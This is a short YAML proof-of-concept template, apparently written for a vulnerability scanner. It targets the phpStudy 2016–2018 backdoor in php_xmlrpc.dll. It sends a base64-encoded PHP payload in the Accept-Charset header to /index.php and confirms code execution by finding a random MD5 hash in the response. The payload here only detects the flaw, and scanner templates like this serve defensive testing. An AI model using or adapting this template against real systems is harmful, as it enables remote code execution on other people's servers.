detail:
  Affected Version: phpstudy 2016-phpstudy 2018 php 5.2 php 5.4
  author: 17bdw
  links:
  - https://www.freebuf.com/column/214946.html
  vuln_url: php_xmlrpc.dll
expression: r0()
manual: true
name: poc-yaml-phpstudy-backdoor-rce
rules:
  r0:
    expression: response.body.bcontains(bytes(md5(r)))
    request:
      cache: true
      follow_redirects: false
      headers:
        Accept-Charset: '{{payload}}'
        Accept-Encoding: gzip,deflate
      method: GET
      path: /index.php
set:
  payload: base64("printf(md5('" + r + "'));")
  r: randomLowercase(6)
transport: http
